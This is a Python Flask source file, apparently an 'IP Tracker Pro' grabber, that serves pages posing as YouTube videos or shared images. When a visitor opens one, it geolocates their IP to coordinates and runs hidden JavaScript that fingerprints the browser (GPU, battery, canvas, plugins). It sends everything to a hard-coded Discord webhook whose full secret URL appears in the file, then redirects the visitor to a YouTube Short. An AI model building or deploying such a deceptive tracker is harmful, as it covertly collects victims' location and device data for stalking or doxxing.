from flask import Flask, request, redirect
from datetime import datetime
import requests
import os
import re
import time
import json

app = Flask(__name__)

# CONFIGURAZIONE
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"

visit_counter = 0

def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "countryCode": data.get("countryCode", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "zip": data.get("zip", "N/D"),
                    "lat": data.get("lat", "N/D"),
                    "lon": data.get("lon", "N/D"),
                    "timezone": data.get("timezone", "N/D"),
                    "isp": data.get("isp", "N/D"),
                    "org": data.get("org", "N/D"),
                    "as": data.get("as", "N/D"),
                    "asname": data.get("asname", "N/D"),
                    "reverse": data.get("reverse", "N/D"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False)
                }
    except:
        pass
    return None

def get_device_info(request):
    ua = request.headers.get('User-Agent', '')
    info = {
        "user_agent": ua[:300],
        "browser": "Sconosciuto",
        "browser_version": "?",
        "os": "Sconosciuto",
        "os_version": "?",
        "device": "Desktop",
        "is_mobile": False,
        "is_tablet": False,
        "is_bot": False
    }
    
    bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
    if any(bot in ua.lower() for bot in bots):
        info["is_bot"] = True
    
    if 'Windows NT 10' in ua: info["os"] = "Windows 10/11"
    elif 'Mac OS X' in ua:
        info["os"] = "macOS"
        v = re.search(r'Mac OS X (\d+[._]\d+)', ua)
        if v: info["os_version"] = v.group(1).replace('_', '.')
    elif 'Android' in ua:
        info["os"] = "Android"
        info["is_mobile"] = True
        info["device"] = "Mobile"
        v = re.search(r'Android (\d+\.\d+)', ua)
        if v: info["os_version"] = v.group(1)
    elif 'iPhone' in ua:
        info["os"] = "iOS (iPhone)"
        info["is_mobile"] = True
        info["device"] = "Mobile"
    elif 'iPad' in ua:
        info["os"] = "iOS (iPad)"
        info["is_tablet"] = True
        info["device"] = "Tablet"
    elif 'Linux' in ua: info["os"] = "Linux"
    
    if 'Edg/' in ua:
        info["browser"] = "Edge"
        v = re.search(r'Edg/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Firefox/' in ua:
        info["browser"] = "Firefox"
        v = re.search(r'Firefox/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Chrome/' in ua:
        info["browser"] = "Chrome"
        v = re.search(r'Chrome/(\d+)', ua)
        if v: info["browser_version"] = v.group(1)
    elif 'Safari/' in ua: info["browser"] = "Safari"
    
    return info

def get_all_ips(request):
    ips = {
        "ip_pubblico_rete": "N/D",
        "ip_privato_locale": "N/D",
        "ip_proxy": "N/D",
        "x_forwarded_for": "N/D",
        "x_real_ip": "N/D",
        "remote_addr": request.remote_addr
    }
    
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ips["x_forwarded_for"] = forwarded
        ip_list = [ip.strip() for ip in forwarded.split(',')]
        if ip_list:
            ips["ip_pubblico_rete"] = ip_list[0]
            if len(ip_list) > 1:
                ips["ip_proxy"] = ip_list[-1]
    
    real_ip = request.headers.get('X-Real-IP', '')
    if real_ip:
        ips["x_real_ip"] = real_ip
    
    if request.remote_addr.startswith(('192.168.', '10.', '172.', '127.')):
        ips["ip_privato_locale"] = request.remote_addr
    
    return ips

def send_to_discord(ip_data, ip_info, device_info, request_info, route_name, fingerprint=None):
    global visit_counter
    visit_counter += 1
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    description = f"**📅 Data e Ora:** `{date}`\n"
    description += f"**🔢 Visita #:** `{visit_counter}`\n"
    description += f"**🛤️ Route:** `{route_name}`\n\n"
    
    # IP Info
    description += "**══════ 🌐 INDIRIZZI IP ══════**\n"
    description += f"**🔢 IP Pubblico:** `{ip_data['ip_pubblico_rete']}`\n"
    if ip_data['ip_privato_locale'] != 'N/D':
        description += f"**🏠 IP Locale:** `{ip_data['ip_privato_locale']}`\n"
    if ip_data['ip_proxy'] != 'N/D':
        description += f"**🔗 Proxy:** `{ip_data['ip_proxy']}`\n"
    description += f"**📡 Remote:** `{ip_data['remote_addr']}`\n"
    
    # Posizione
    if ip_info:
        description += "\n**══════ 📍 POSIZIONE ══════**\n"
        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')} ({ip_info.get('countryCode', 'N/D')})\n"
        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}, {ip_info.get('region', 'N/D')}\n"
        description += f"**📍 Coordinate:** {ip_info.get('lat', 'N/D')}, {ip_info.get('lon', 'N/D')}\n"
        description += f"**📡 ISP:** {ip_info.get('isp', 'N/D')}\n"
        description += f"**🕐 Timezone:** {ip_info.get('timezone', 'N/D')}\n"
        flags = []
        if ip_info.get('mobile'): flags.append("📱Mobile")
        if ip_info.get('proxy'): flags.append("🔒Proxy")
        if ip_info.get('hosting'): flags.append("🏢Hosting")
        if flags: description += f"**🚩 Flag:** {' | '.join(flags)}\n"
    
    # Dispositivo
    description += "\n**══════ 💻 DISPOSITIVO ══════**\n"
    description += f"**🖥️ OS:** {device_info.get('os', 'N/D')} {device_info.get('os_version', '')}\n"
    description += f"**🌐 Browser:** {device_info.get('browser', 'N/D')} v{device_info.get('browser_version', '')}\n"
    description += f"**📱 Tipo:** {device_info.get('device', 'N/D')}\n"
    description += f"**🔤 Lingue:** {request_info.get('accept_language', 'N/D')[:80]}\n"
    
    # FINGERPRINTING (se presente)
    if fingerprint:
        description += "\n**══════ 🔬 FINGERPRINTING ══════**\n"
        if fingerprint.get('screen'): description += f"**📺 Schermo:** {fingerprint['screen']} ({fingerprint.get('colorDepth','?')})\n"
        if fingerprint.get('pixelRatio'): description += f"**🔍 Pixel Ratio:** {fingerprint['pixelRatio']}\n"
        if fingerprint.get('platform'): description += f"**💿 Platform:** {fingerprint['platform']}\n"
        if fingerprint.get('cores'): description += f"**⚙️ CPU Core:** {fingerprint['cores']}\n"
        if fingerprint.get('memory'): description += f"**💾 RAM:** {fingerprint['memory']} GB\n"
        if fingerprint.get('connection'): description += f"**📶 Rete:** {fingerprint['connection']}\n"
        if fingerprint.get('touch'): description += f"**👆 Touch:** {fingerprint['touch']}\n"
        if fingerprint.get('battery'): 
            description += f"**🔋 Batteria:** {fingerprint['battery']}"
            if fingerprint.get('charging'): description += f" | Carica: {fingerprint['charging']}"
            description += "\n"
        if fingerprint.get('gpu'): description += f"**🎮 GPU:** {fingerprint['gpu']}\n"
        if fingerprint.get('gpuVendor'): description += f"**🏢 Vendor:** {fingerprint['gpuVendor']}\n"
        if fingerprint.get('canvas'): description += f"**🎨 Canvas ID:** `{fingerprint['canvas'][:50]}...`\n"
        if fingerprint.get('fonts'): description += f"**🔤 Font:** {fingerprint['fonts']}\n"
        if fingerprint.get('timezone'): description += f"**🕐 TZ Browser:** {fingerprint['timezone']}\n"
        if fingerprint.get('language'): description += f"**🌐 Lingua:** {fingerprint['language']}\n"
        if fingerprint.get('cookiesEnabled'): description += f"**🍪 Cookies:** {fingerprint['cookiesEnabled']}\n"
        if fingerprint.get('plugins'): description += f"**🔌 Plugin:** {fingerprint['plugins']}\n"
    
    # Richiesta
    description += "\n**══════ 📡 RICHIESTA ══════**\n"
    description += f"**🔗 Referrer:** {request_info.get('referrer', 'N/D')[:80]}\n"
    description += f"**📋 Metodo:** {request_info.get('method', 'N/D')}\n"
    
    # Mappa
    if ip_info and ip_info.get('lat') != 'N/D':
        description += f"\n**🗺️ Mappa:** [Clicca qui](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})\n"
    
    data = {
        "content": f"🔔 **#{visit_counter}** | `{ip_data['ip_pubblico_rete']}` | {ip_info.get('country', '?') if ip_info else '?'}",
        "embeds": [{
            "title": "🎯 REPORT COMPLETO",
            "description": description,
            "color": 5814783,
            "timestamp": date,
            "footer": {"text": f"IP Tracker Pro • #{visit_counter}"}
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"✅ #{visit_counter}")
        elif response.status_code == 429:
            time.sleep(2)
            requests.post(WEBHOOK_URL, json=data)
    except:
        pass

# ============ ROUTES ============

@app.route("/")
def index():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
    device_info = get_device_info(request)
    request_info = {
        "method": request.method,
        "referrer": request.headers.get('Referer', 'N/D'),
        "accept_language": request.headers.get('Accept-Language', 'N/D'),
        "dnt": request.headers.get('DNT', 'N/D'),
        "cookies": len(request.cookies)
    }
    
    # Invia report base SUBITO (senza fingerprint)
    send_to_discord(ip_data, ip_info, device_info, request_info, "Home")
    
    # Pagina con fingerprinting che invia un SECONDO report
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="YouTube">
        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
    </head>
    <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
        <p style="color:#fff;font-family:Arial;font-size:18px;">Caricamento...</p>
        <script>
            var fp = {};
            fp.screen = screen.width + 'x' + screen.height;
            fp.colorDepth = screen.colorDepth + ' bit';
            fp.pixelRatio = window.devicePixelRatio || '?';
            fp.platform = navigator.platform || '?';
            fp.cores = navigator.hardwareConcurrency || '?';
            fp.memory = navigator.deviceMemory || '?';
            fp.connection = navigator.connection ? navigator.connection.effectiveType : '?';
            fp.touch = ('ontouchstart' in window) ? 'Si' : 'No';
            fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            fp.language = navigator.language;
            fp.cookiesEnabled = navigator.cookieEnabled ? 'Si' : 'No';
            
            try {
                if (navigator.getBattery) {
                    navigator.getBattery().then(function(b) {
                        fp.battery = Math.round(b.level * 100) + '%';
                        fp.charging = b.charging ? 'Si' : 'No';
                    });
                }
            } catch(e) {}
            
            try {
                var c = document.createElement('canvas');
                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) {
                        fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                        fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                    }
                }
            } catch(e) {}
            
            try {
                var c2 = document.createElement('canvas');
                c2.width = 200; c2.height = 50;
                var ctx = c2.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('Test 123!', 2, 15);
                fp.canvas = c2.toDataURL().substring(0, 80);
            } catch(e) {}
            
            fp.fonts = 'Testato';
            
            try {
                if (navigator.plugins) {
                    var p = [];
                    for (var i = 0; i < Math.min(navigator.plugins.length, 3); i++) {
                        p.push(navigator.plugins[i].name);
                    }
                    fp.plugins = p.join(', ') || 'Nessuno';
                }
            } catch(e) {}
            
            // Invia fingerprint e POI redirect
            fetch('/fp', {
                method: 'POST',
                body: JSON.stringify(fp),
                headers: {'Content-Type': 'application/json'}
            }).then(function() {
                window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
            }).catch(function() {
                window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
            });
        </script>
    </body>
    </html>
    """

@app.route("/img")
@app.route("/image")
@app.route("/photo")
@app.route("/pic")
def image_tracker():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
    device_info = get_device_info(request)
    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
    send_to_discord(ip_data, ip_info, device_info, request_info, "Immagine")
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Guarda questa immagine!">
        <meta property="og:description" content="Clicca per vederla meglio">
        <meta property="og:image" content="{IMAGE_URL}">
        <meta property="og:type" content="website">
        <meta name="twitter:card" content="summary_large_image">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ background: #1a1a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; cursor: pointer; font-family: Arial, sans-serif; }}
            .container {{ text-align: center; padding: 20px; }}
            .container img {{ max-width: 90vw; max-height: 80vh; border-radius: 10px; box-shadow: 0 0 30px rgba(255,255,255,0.1); transition: all 0.3s ease; }}
            .container img:hover {{ transform: scale(1.02); box-shadow: 0 0 40px rgba(255,255,255,0.2); }}
            .container p {{ color: #888; margin-top: 15px; font-size: 14px; }}
        </style>
    </head>
    <body onclick="redirectToVideo()">
        <div class="container">
            <img src="{IMAGE_URL}" alt="Clicca qui" id="mainImage">
            <p>Clicca sull'immagine per continuare...</p>
        </div>
        <script>
            function redirectToVideo() {{ window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"; }}
            document.getElementById('mainImage').addEventListener('click', function(e) {{ redirectToVideo(); }});
        </script>
    </body>
    </html>
    """

@app.route("/video")
@app.route("/shorts")
@app.route("/watch")
@app.route("/yt")
def video_preview():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
    device_info = get_device_info(request)
    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
    send_to_discord(ip_data, ip_info, device_info, request_info, "Video")
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

# 🆕 Endpoint fingerprint - INVIA UN SECONDO REPORT con i dati fingerprint
@app.route("/fp", methods=["POST"])
def receive_fingerprint():
    try:
        fp = request.get_json()
        if fp:
            # Crea un secondo report SOLO con fingerprint
            date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
            description = "**══════ 🔬 FINGERPRINTING ══════**\n"
            if fp.get('screen'): description += f"**📺 Schermo:** {fp['screen']} ({fp.get('colorDepth','?')})\n"
            if fp.get('pixelRatio'): description += f"**🔍 Pixel Ratio:** {fp['pixelRatio']}\n"
            if fp.get('platform'): description += f"**💿 Platform:** {fp['platform']}\n"
            if fp.get('cores'): description += f"**⚙️ CPU Core:** {fp['cores']}\n"
            if fp.get('memory'): description += f"**💾 RAM:** {fp['memory']} GB\n"
            if fp.get('connection'): description += f"**📶 Rete:** {fp['connection']}\n"
            if fp.get('touch'): description += f"**👆 Touch:** {fp['touch']}\n"
            if fp.get('battery'): 
                description += f"**🔋 Batteria:** {fp['battery']}"
                if fp.get('charging'): description += f" | Carica: {fp['charging']}"
                description += "\n"
            if fp.get('gpu'): description += f"**🎮 GPU:** {fp['gpu']}\n"
            if fp.get('gpuVendor'): description += f"**🏢 Vendor:** {fp['gpuVendor']}\n"
            if fp.get('canvas'): description += f"**🎨 Canvas ID:** `{fp['canvas'][:50]}...`\n"
            if fp.get('fonts'): description += f"**🔤 Font:** {fp['fonts']}\n"
            if fp.get('timezone'): description += f"**🕐 TZ Browser:** {fp['timezone']}\n"
            if fp.get('language'): description += f"**🌐 Lingua:** {fp['language']}\n"
            if fp.get('cookiesEnabled'): description += f"**🍪 Cookies:** {fp['cookiesEnabled']}\n"
            if fp.get('plugins'): description += f"**🔌 Plugin:** {fp['plugins']}\n"
            
            data = {
                "content": "🔬 **Fingerprint aggiuntivo**",
                "embeds": [{
                    "title": "🔬 DETTAGLI TECNICI",
                    "description": description,
                    "color": 16776960,
                    "timestamp": date
                }]
            }
            
            try:
                requests.post(WEBHOOK_URL, json=data, timeout=5)
                print("✅ Fingerprint inviato")
            except:
                pass
    except:
        pass
    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
